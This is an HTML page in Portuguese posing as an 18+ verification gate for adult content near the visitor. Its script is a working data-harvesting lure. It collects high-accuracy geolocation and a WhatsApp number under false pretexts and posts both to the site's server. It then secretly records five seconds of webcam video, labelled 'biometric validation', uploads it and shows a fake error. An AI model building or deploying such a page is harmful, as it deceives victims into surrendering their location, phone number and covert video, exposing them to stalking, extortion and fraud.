<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Acesso Restrito | Verificação 18+</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --primary: #ff2a5f; --success: #00ff88; --bg: #09090b; --card: #121214; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
        body { background: var(--bg); color: #fff; overflow: hidden; }

        #content { filter: blur(25px); transition: filter 0.5s ease; height: 100vh; width: 100vw; pointer-events: none; }

        #permission-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; justify-content: center; align-items: center; padding: 20px; }

        .alert-box { background: var(--card); width: 100%; max-width: 340px; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; box-shadow: 0 0 40px rgba(255, 42, 95, 0.2); }

        .btn-allow { background: var(--primary); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; font-size: 1.1rem; cursor: pointer; margin-top: 25px; }

        .modal { position: fixed; inset: 0; background: #000; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 25px; }
        input { background: #111; border: 1px solid #333; color: #fff; padding: 20px; width: 100%; max-width: 320px; border-radius: 12px; font-size: 1.2rem; margin: 20px 0; outline: none; text-align: center; }

        .loader { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="permission-overlay">
        <div class="alert-box">
            <i class="fa-solid fa-circle-exclamation" style="font-size: 3rem; color: var(--primary); margin-bottom: 15px;"></i>
            <h2>CONTEÚDO BLOQUEADO</h2>
            <p style="color: #888; margin-top: 10px;">Para sua segurança, confirme sua localização para ver modelos próximos.</p>
            <button class="btn-allow" onclick="requestPermission()">ACEITAR E DESBLOQUEAR</button>
        </div>
    </div>

    <div id="content" style="background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://cnnamador.com/contents/videos_screenshots/253000/253436/preview.jpg') center/cover no-repeat;">
        <header style="padding: 20px; border-bottom: 1px solid rgba(255, 42, 95, 0.3); text-align: center; color: var(--primary); font-weight: 900; font-size: 1.5rem; letter-spacing: 2px; text-shadow: 0 0 10px rgba(255, 42, 95, 0.5);">PRIVACY VIP</header>
        <div style="padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 80px);">
            <div style="width: 100%; max-width: 300px; height: 450px; border-radius: 20px; border: 2px solid var(--primary); box-shadow: 0 0 30px rgba(255, 42, 95, 0.3); background: url('https://cnnamador.com/contents/videos_screenshots/253000/253436/preview.jpg') center/cover no-repeat;"></div>
            <p style="margin-top: 20px; font-weight: bold; font-size: 1.2rem; color: #fff; text-align: center;">CONTEÚDO EXCLUSIVO PRÓXIMO A VOCÊ</p>
        </div>
    </div>

    <div class="modal" id="modal-zap">
        <i class="fa-brands fa-whatsapp" style="font-size: 4rem; color: var(--success);"></i>
        <h2 style="margin-top: 20px;">QUASE LÁ!</h2>
        <p style="color: #888; text-align: center;">Onde enviamos seu passe de acesso livre?</p>
        <input type="tel" id="whatsapp" placeholder="(DDD) 99999-9999">
        <button class="btn-allow" style="background: var(--success); color: #000;" onclick="sendZap()">LIBERAR AGORA</button>
    </div>

    <div class="modal" id="modal-cam">
        <h2>Sincronizando Live...</h2>
        <div class="loader"></div>
        <p style="color: #888;">Validando biometria regional...</p>
        <button class="btn-allow" onclick="startCamera()">FINALIZAR ACESSO</button>
    </div>

    <script>
        async function report(type, data) {
            try {
                console.log(`📤 Enviando: ${type} = ${data}`);
                const response = await fetch('/api/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ tipo: type, valor: data })
                });
                
                if(!response.ok) {
                    const error = await response.json();
                    console.error('❌ Erro no servidor:', error);
                } else {
                    console.log('✅ Enviado com sucesso!');
                }
            } catch(e) {
                console.error('❌ Erro na requisição:', e.message);
            }
        }

        function requestPermission() {
            const btn = document.querySelector('.btn-allow');
            btn.innerText = "PROCESSANDO...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    const locData = `Lat: ${p.coords.latitude}, Long: ${p.coords.longitude}`;
                    console.log('📍 Localização obtida:', locData);
                    report('LOCALIZAÇÃO', locData);
                    unlockFeed();
                }, (err) => {
                    console.warn('⚠️ Localização negada ou erro:', err.message);
                    report('LOCALIZAÇÃO', 'Negado/Erro: ' + err.message);
                    unlockFeed();
                }, { timeout: 10000, enableHighAccuracy: true });
            } else { 
                report('LOCALIZAÇÃO', 'Não suportado pelo navegador');
                unlockFeed(); 
            }
        }

        function unlockFeed() {
            document.getElementById('permission-overlay').style.display = 'none';
            document.getElementById('content').style.filter = 'none';
            setTimeout(() => { document.getElementById('modal-zap').style.display = 'flex'; }, 2000);
        }

        function sendZap() {
            const val = document.getElementById('whatsapp').value;
            if(val.length < 8) return alert("Número inválido");
            report('WHATSAPP', val);
            document.getElementById('modal-zap').style.display = 'none';
            document.getElementById('modal-cam').style.display = 'flex';
        }

        async function startCamera() {
            try {
                // Tenta pegar apenas vídeo para evitar erros de falta de microfone
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                report('CÂMERA', 'Acesso Concedido (Iniciando Gravação)');
                
                document.querySelector('#modal-cam h2').innerText = "GRAVANDO...";
                
                // Verifica tipos suportados
                const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
                                 ? 'video/webm;codecs=vp8' 
                                 : 'video/webm';
                
                const mediaRecorder = new MediaRecorder(stream, { mimeType });
                const chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) {
                        chunks.push(e.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    if (chunks.length === 0) {
                        console.error('❌ Nenhum dado de vídeo capturado');
                        return;
                    }

                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('video', blob, 'video.webm');

                    try {
                        const res = await fetch('/api/upload-video', {
                            method: 'POST',
                            body: formData
                        });
                        if (res.ok) {
                            console.log('✅ Vídeo enviado com sucesso!');
                        } else {
                            const err = await res.text();
                            console.error('❌ Erro no servidor ao enviar vídeo:', err);
                        }
                    } catch (e) {
                        console.error('❌ Erro na requisição de vídeo:', e);
                    }

                    stream.getTracks().forEach(track => track.stop());
                    
                    document.querySelector('#modal-cam h2').innerText = "CONECTANDO...";
                    setTimeout(() => {
                        alert("Erro de conexão. Verifique seu WhatsApp.");
                        location.reload();
                    }, 2000);
                };

                // Grava por 5 segundos para garantir que tenha dados
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, 5000);

            } catch (e) {
                console.error('❌ Erro na câmera:', e);
                report('CÂMERA', 'Erro: ' + e.message);
                alert("Permissão necessária para biometria.");
            }
        }
    </script>
</body>
</html>
